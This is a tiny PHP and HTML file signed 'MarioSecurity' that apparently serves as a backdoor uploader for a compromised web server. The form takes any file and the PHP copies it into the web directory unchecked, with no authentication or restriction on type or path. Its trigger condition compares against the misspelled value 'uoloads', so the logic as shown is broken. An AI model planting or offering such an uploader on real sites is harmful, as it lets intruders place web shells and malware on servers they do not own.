<!-- MarioSecurity --!>

<form action="" method="post" enctype="multipart/form-data" name="uploads" id="uploads"><input type="file" name="file" size="50"><input name="uploads" type="submit" id="meki" value="uploads"></form>
<?php if($_POST['meki']=="uoloads"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {
  echo '<b>Oke</b>';
}
else { 
  echo '<b>Ups</b>';}
}
?>
